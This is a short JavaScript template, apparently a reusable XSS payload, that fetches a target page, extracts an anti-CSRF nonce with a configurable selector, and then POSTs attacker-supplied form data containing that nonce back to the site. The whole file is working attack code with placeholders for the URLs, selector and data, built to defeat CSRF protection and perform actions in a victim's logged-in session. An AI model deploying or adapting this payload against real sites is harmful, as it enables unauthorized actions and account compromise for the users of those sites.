/*
 * @KaiyiZhang Github
 */
//The Variable
var gurl = "$GURL";                             //The GET URL
var purl = "$PURL";                             //The POST URL
var selector="$SELECTOR";                       //The Selector for Query nonce value

//Get Method for nonce value
var xhr = new XMLHttpRequest();
xhr.open('GET',gurl,'true');       

var nonce;
xhr.onreadystatechange = function(){

if(xhr.readyState==4 && xhr.status==200){
  var d;
  d = document.createElement('div');
  d.innerHTML = xhr.responseText;
  nonce = d.querySelector(selector).value;
  
  //Get the nonce value and Post 
  if(nonce != undefined){
     var xhr2 = new XMLHttpRequest();
     xhr2.open('POST',purl); 
     xhr2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
     var data="$DATA";                               //The Data Posted, This allways include the nonce value from GET
     xhr2.send(data);
    }
  }
}

xhr.send();
